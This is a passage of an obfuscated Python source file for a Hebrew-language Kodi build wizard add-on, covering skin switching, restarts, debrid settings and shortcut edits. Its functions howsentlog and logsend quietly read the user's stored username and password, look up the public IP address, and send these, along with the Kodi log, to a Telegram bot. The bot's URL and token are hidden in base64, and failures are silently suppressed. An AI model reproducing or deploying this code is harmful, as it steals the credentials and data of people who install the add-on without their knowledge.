# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:219
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:220
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:221
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:222
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:223
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:224
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:225
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:226
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:227
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:228
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:229
LOGFILES =wiz .LOGFILES #line:230
TRAKTID =traktit .TRAKTID #line:231
DEBRIDID =debridit .DEBRIDID #line:232
LOGINID =loginit .LOGINID #line:233
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:234
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:235
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:236
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:237
fullsecfold =xbmc .translatePath ('special://home')#line:238
addons_folder =os .path .join (fullsecfold ,'addons')#line:240
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:242
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:244
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:246
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:247
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:248
def MainMenu ():#line:255
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:257
def skinWIN ():#line:258
	idle ()#line:259
	O00000OO00OO000O0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:260
	OO0O0OOOO0O0OOO00 =[];O00O00OOO0O00000O =[]#line:261
	for O00O0OOOO0OOO0O00 in sorted (O00000OO00OO000O0 ,key =lambda OO0000000OOOO00O0 :OO0000000OOOO00O0 ):#line:262
		OOO000O00OOOO0O00 =os .path .split (O00O0OOOO0OOO0O00 [:-1 ])[1 ]#line:263
		O0O0OO0O0000O000O =os .path .join (O00O0OOOO0OOO0O00 ,'addon.xml')#line:264
		if os .path .exists (O0O0OO0O0000O000O ):#line:265
			O0OOO00O0O00OO0O0 =open (O0O0OO0O0000O000O )#line:266
			O00O0O0O0000O0000 =O0OOO00O0O00OO0O0 .read ()#line:267
			O000O00OOO00O0O00 =parseDOM2 (O00O0O0O0000O0000 ,'addon',ret ='id')#line:268
			OO0O00OOOOOO0O0OO =OOO000O00OOOO0O00 if len (O000O00OOO00O0O00 )==0 else O000O00OOO00O0O00 [0 ]#line:269
			try :#line:270
				O00O0OOOO000O00O0 =xbmcaddon .Addon (id =OO0O00OOOOOO0O0OO )#line:271
				OO0O0OOOO0O0OOO00 .append (O00O0OOOO000O00O0 .getAddonInfo ('name'))#line:272
				O00O00OOO0O00000O .append (OO0O00OOOOOO0O0OO )#line:273
			except :#line:274
				pass #line:275
	OOO000O000O000O0O =[];O0OOOOO0OOO0O0OO0 =0 #line:276
	O00OOO00O00000000 =["Current Skin -- %s"%currSkin ()]+OO0O0OOOO0O0OOO00 #line:277
	O0OOOOO0OOO0O0OO0 =DIALOG .select ("Select the Skin you want to swap with.",O00OOO00O00000000 )#line:278
	if O0OOOOO0OOO0O0OO0 ==-1 :return #line:279
	else :#line:280
		OOOOO0OOOO0000OOO =(O0OOOOO0OOO0O0OO0 -1 )#line:281
		OOO000O000O000O0O .append (OOOOO0OOOO0000OOO )#line:282
		O00OOO00O00000000 [O0OOOOO0OOO0O0OO0 ]="%s"%(OO0O0OOOO0O0OOO00 [OOOOO0OOOO0000OOO ])#line:283
	if OOO000O000O000O0O ==None :return #line:284
	for O0O0000O0000O0OOO in OOO000O000O000O0O :#line:285
		swapSkins (O00O00OOO0O00000O [O0O0000O0000O0OOO ])#line:286
def currSkin ():#line:288
	return xbmc .getSkinDir ('Container.PluginName')#line:289
def swapSkins (O0O000OOOO00O00O0 ,title ="Error"):#line:290
	OO000O00O0OOOO00O ='lookandfeel.skin'#line:291
	OOOO0O00000O0OOO0 =O0O000OOOO00O00O0 #line:292
	OOOOO0O00000O0O00 =getOld (OO000O00O0OOOO00O )#line:293
	OO00OO000000O0O00 =OO000O00O0OOOO00O #line:294
	setNew (OO00OO000000O0O00 ,OOOO0O00000O0OOO0 )#line:295
	O00O0OO00OOOO00OO =0 #line:296
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0OO00OOOO00OO <100 :#line:297
		O00O0OO00OOOO00OO +=1 #line:298
		xbmc .sleep (1 )#line:299
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:300
		xbmc .executebuiltin ('SendClick(11)')#line:301
	return True #line:302
def getOld (O0O0O0000O0O00OOO ):#line:304
	try :#line:305
		O0O0O0000O0O00OOO ='"%s"'%O0O0O0000O0O00OOO #line:306
		O00OO0OO0OOOOO000 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0O0O0000O0O00OOO )#line:307
		OOO0O00OOOO0OOO0O =xbmc .executeJSONRPC (O00OO0OO0OOOOO000 )#line:309
		OOO0O00OOOO0OOO0O =simplejson .loads (OOO0O00OOOO0OOO0O )#line:310
		if OOO0O00OOOO0OOO0O .has_key ('result'):#line:311
			if OOO0O00OOOO0OOO0O ['result'].has_key ('value'):#line:312
				return OOO0O00OOOO0OOO0O ['result']['value']#line:313
	except :#line:314
		pass #line:315
	return None #line:316
def setNew (O0O00OO0O0O000000 ,OOOOOO00OO00000OO ):#line:319
	try :#line:320
		O0O00OO0O0O000000 ='"%s"'%O0O00OO0O0O000000 #line:321
		OOOOOO00OO00000OO ='"%s"'%OOOOOO00OO00000OO #line:322
		OOOOOOO000O0OO000 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0O00OO0O0O000000 ,OOOOOO00OO00000OO )#line:323
		OOOO0O000O000000O =xbmc .executeJSONRPC (OOOOOOO000O0OO000 )#line:325
	except :#line:326
		pass #line:327
	return None #line:328
def idle ():#line:329
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:330
def resetkodi ():#line:332
		if xbmc .getCondVisibility ('system.platform.windows'):#line:333
			OO0O0O0O0OO00O00O =xbmcgui .DialogProgress ()#line:334
			OO0O0O0O0OO00O00O .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:337
			OO0O0O0O0OO00O00O .update (0 )#line:338
			for O0O000O00OOOOO0O0 in range (5 ,-1 ,-1 ):#line:339
				time .sleep (1 )#line:340
				OO0O0O0O0OO00O00O .update (int ((5 -O0O000O00OOOOO0O0 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0O000O00OOOOO0O0 ),'')#line:341
				if OO0O0O0O0OO00O00O .iscanceled ():#line:342
					from resources .libs import win #line:343
					return None ,None #line:344
			from resources .libs import win #line:345
		else :#line:346
			OO0O0O0O0OO00O00O =xbmcgui .DialogProgress ()#line:347
			OO0O0O0O0OO00O00O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:350
			OO0O0O0O0OO00O00O .update (0 )#line:351
			for O0O000O00OOOOO0O0 in range (5 ,-1 ,-1 ):#line:352
				time .sleep (1 )#line:353
				OO0O0O0O0OO00O00O .update (int ((5 -O0O000O00OOOOO0O0 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0O000O00OOOOO0O0 ),'')#line:354
				if OO0O0O0O0OO00O00O .iscanceled ():#line:355
					os ._exit (1 )#line:356
					return None ,None #line:357
			os ._exit (1 )#line:358
def backtokodi ():#line:360
			wiz .kodi17Fix ()#line:361
			fix18update ()#line:362
			fix17update ()#line:363
def testcommand ():#line:365
  wiz .kodi17Fix ()#line:366
def howsentlog ():#line:368
       try :#line:369
          import json #line:370
          OOOO0OO00O0OO0O00 =(ADDON .getSetting ("user"))#line:371
          OO0O0O0O0O0OOO00O =(ADDON .getSetting ("pass"))#line:372
          O000OOOOOOO0OO000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:373
          OO0OOOO00O0000OOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:375
          OO0OO00O000OO0000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:376
          O00O0O00O000O000O =str (json .loads (OO0OO00O000OO0000 )['ip'])#line:377
          O00OO000O00OO000O =OOOO0OO00O0OO0O00 #line:378
          O0OOOO0O0O00O000O =OO0O0O0O0O0OOO00O #line:379
          import socket #line:381
          OO0OO00O000OO0000 =urllib2 .urlopen (OO0OOOO00O0000OOO .decode ('base64')+' - '+O00OO000O00OO000O +' - '+O0OOOO0O0O00O000O +' - '+O000OOOOOOO0OO000 ).readlines ()#line:382
       except :pass #line:383
def googleindicat ():#line:386
			import logg #line:387
			OO0O0O0OOOOOOO0OO =(ADDON .getSetting ("pass"))#line:388
			O0O0O00OO000OOOOO =(ADDON .getSetting ("user"))#line:389
			logg .logGA (OO0O0O0OOOOOOO0OO ,O0O0O00OO000OOOOO )#line:390
def logsend ():#line:391
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:392
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:393
      howsentlog ()#line:395
      import requests #line:396
      if xbmc .getCondVisibility ('system.platform.windows'):#line:397
         O0O0O00OOOOOO0O00 =xbmc .translatePath ('special://home/kodi.log')#line:398
         OOO000OO00OOOO000 ={'chat_id':(None ,'-274262389'),'document':(O0O0O00OOOOOO0O00 ,open (O0O0O00OOOOOO0O00 ,'rb')),}#line:402
         OO000O0000000OO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:403
         O0OO0O0O0OOOO00O0 =requests .post (OO000O0000000OO00 .decode ('base64'),files =OOO000OO00OOOO000 )#line:405
      elif xbmc .getCondVisibility ('system.platform.android'):#line:406
           O0O0O00OOOOOO0O00 =xbmc .translatePath ('special://temp/kodi.log')#line:407
           OOO000OO00OOOO000 ={'chat_id':(None ,'-274262389'),'document':(O0O0O00OOOOOO0O00 ,open (O0O0O00OOOOOO0O00 ,'rb')),}#line:411
           OO000O0000000OO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:412
           O0OO0O0O0OOOO00O0 =requests .post (OO000O0000000OO00 .decode ('base64'),files =OOO000OO00OOOO000 )#line:414
      else :#line:415
           O0O0O00OOOOOO0O00 =xbmc .translatePath ('special://kodi.log')#line:416
           OOO000OO00OOOO000 ={'chat_id':(None ,'-274262389'),'document':(O0O0O00OOOOOO0O00 ,open (O0O0O00OOOOOO0O00 ,'rb')),}#line:420
           OO000O0000000OO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:421
           O0OO0O0O0OOOO00O0 =requests .post (OO000O0000000OO00 .decode ('base64'),files =OOO000OO00OOOO000 )#line:423
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:424
def rdoff ():#line:426
	OOO000O0OO00OO0O0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:427
	OOO000O0OO00OO0O0 .setSetting ('rd.client_id','')#line:428
	OOO000O0OO00OO0O0 .setSetting ('rd.secret','')#line:429
	OOO000O0OO00OO0O0 .setSetting ('rdsource','false')#line:430
	OOO000O0OO00OO0O0 .setSetting ('super_fast_type_toren','false')#line:431
	OOO000O0OO00OO0O0 .setSetting ('rd.auth','false')#line:432
	OOO000O0OO00OO0O0 .setSetting ('rd.refresh','false')#line:433
	OOO000O0OO00OO0O0 =xbmcaddon .Addon ('script.module.resolveurl')#line:435
	OOO000O0OO00OO0O0 .setSetting ('RealDebridResolver_client_id','')#line:436
	OOO000O0OO00OO0O0 .setSetting ('RealDebridResolver_client_secret','')#line:437
	OOO000O0OO00OO0O0 .setSetting ('RealDebridResolver_token','')#line:438
	OOO000O0OO00OO0O0 .setSetting ('RealDebridResolver_refresh','')#line:439
	OOO000O0OO00OO0O0 =xbmcaddon .Addon ('plugin.video.seren')#line:441
	OOO000O0OO00OO0O0 .setSetting ('rd.client_id','')#line:442
	OOO000O0OO00OO0O0 .setSetting ('rd.secret','')#line:443
	OOO000O0OO00OO0O0 .setSetting ('rd.auth','')#line:444
	OOO000O0OO00OO0O0 .setSetting ('rd.refresh','')#line:445
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:446
		OOO000O0OO00OO0O0 =xbmcaddon .Addon ('plugin.video.gaia')#line:447
		OOO000O0OO00OO0O0 .setSetting ('accounts.debrid.realdebrid.id','')#line:448
		OOO000O0OO00OO0O0 .setSetting ('accounts.debrid.realdebrid.secret','')#line:449
		OOO000O0OO00OO0O0 .setSetting ('accounts.debrid.realdebrid.token','')#line:450
		OOO000O0OO00OO0O0 .setSetting ('accounts.debrid.realdebrid.refresh','')#line:451
	resloginit .resloginit ('restore','all')#line:452
	O00OOOOO0O0OOOO0O =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:454
	O0OO00OO0OOO00O0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:455
	copyfile (O00OOOOO0O0OOOO0O ,O0OO00OO0OOO00O0O )#line:456
def skindialogsettind18 ():#line:457
	try :#line:458
		OOOO0O0O0O000OO0O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:459
		O0O0000O00OO0O000 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:460
		copyfile (OOOO0O0O0O000OO0O ,O0O0000O00OO0O000 )#line:461
	except :pass #line:462
def rdon ():#line:463
	loginit .loginIt ('restore','all')#line:464
	OO0000O0OO0000O0O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:466
	O00O0000O00O0O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:467
	copyfile (OO0000O0OO0000O0O ,O00O0000O00O0O0OO )#line:468
def adults18 ():#line:470
  O00000OO0OOOO0O0O =(ADDON .getSetting ("adults"))#line:471
  if O00000OO0OOOO0O0O =='true':#line:472
    OOO0OOOOO0O00O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:473
    with open (OOO0OOOOO0O00O0OO ,'r')as OO0OO0OOOO0000OO0 :#line:474
      O0000O0OO0O0O0OOO =OO0OO0OOOO0000OO0 .read ()#line:475
    O0000O0OO0O0O0OOO =O0000O0OO0O0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:493
    with open (OOO0OOOOO0O00O0OO ,'w')as OO0OO0OOOO0000OO0 :#line:496
      OO0OO0OOOO0000OO0 .write (O0000O0OO0O0O0OOO )#line:497
def rdbuildaddon ():#line:498
  OOOO0O0O0O000OOOO =(ADDON .getSetting ("rdbuild"))#line:499
  if OOOO0O0O0O000OOOO =='true':#line:500
    OOO0O00OOOO000OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:501
    with open (OOO0O00OOOO000OOO ,'r')as O00O0OO0O0OOO00OO :#line:502
      O0O0OOOOOOO000OOO =O00O0OO0O0OOO00OO .read ()#line:503
    O0O0OOOOOOO000OOO =O0O0OOOOOOO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:521
    with open (OOO0O00OOOO000OOO ,'w')as O00O0OO0O0OOO00OO :#line:524
      O00O0OO0O0OOO00OO .write (O0O0OOOOOOO000OOO )#line:525
    OOO0O00OOOO000OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:529
    with open (OOO0O00OOOO000OOO ,'r')as O00O0OO0O0OOO00OO :#line:530
      O0O0OOOOOOO000OOO =O00O0OO0O0OOO00OO .read ()#line:531
    O0O0OOOOOOO000OOO =O0O0OOOOOOO000OOO .replace ('''	<shortcut>
		<defaultID />
